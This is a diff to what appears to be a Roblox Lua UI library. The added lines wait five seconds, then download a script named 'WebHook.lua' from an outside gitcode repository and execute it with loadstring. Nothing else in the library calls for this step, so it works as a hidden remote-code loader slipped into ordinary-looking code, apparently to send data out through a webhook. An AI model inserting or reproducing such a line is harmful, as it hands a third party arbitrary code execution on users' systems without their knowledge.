@@ -1,6 +1,11 @@
 repeat
     task.wait()
 until game:IsLoaded()
+
+task.delay(5, function()
+    loadstring(game:HttpGet("https://raw.gitcode.com/XiaoYunUwU/XA/raw/main/WebHook.lua"))("Hub")
+end)
+
 local Library = {}
 Library.currentTab = nil
 Library.flags = {}
